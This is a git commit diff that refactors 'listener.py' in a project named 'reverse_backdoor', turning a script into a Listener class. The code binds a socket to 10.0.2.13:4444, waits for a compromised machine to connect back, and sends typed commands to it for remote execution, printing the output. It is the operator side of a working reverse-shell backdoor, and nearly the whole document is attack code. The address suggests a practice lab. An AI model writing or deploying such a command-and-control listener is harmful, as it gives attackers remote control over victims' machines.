9a53d00b80923ef31fc6e3a1d178e20213709640
Robert Paruch <roobbb@live.com>
2020-07-15 00:04:06 -0700

    Update listener.py

--- reverse_backdoor/listener.py
+++ reverse_backdoor/listener.py
@@ -1,15 +1,29 @@
 import socket
 
-listener = socket.socket(socket.AF_INET, socket. SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(('10.0.2.13', 4444))
-listener.listen(0)
-print('[+] Waiting for incoming connections')
-connection, address = listener.accept()
-print(f'[+] Got a connection from {address}')
 
-while True:
-    command = input('>> ').encode()
-    connection.send(command)
-    result = connection.recv(1024).decode(errors='replace')
-    print(result)
+class Listener:
+    def __init__(self, ip, port, start=True):
+        listener = socket.socket(socket.AF_INET, socket. SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print('[+] Waiting for incoming connections')
+        self.connection, address = listener.accept()
+        print(f'[+] Got a connection from {address}')
+
+        if start:
+            self.run()
+
+    def execute_remotely(self, command):
+        command = command.encode()
+        self.connection.send(command)
+        return self.connection.recv(1024).decode(errors='replace')
+
+    def run(self):
+        while True:
+            command = input('>> ')
+            result = self.execute_remotely(command)
+            print(result)
+
+
+Listener('10.0.2.13', 4444)
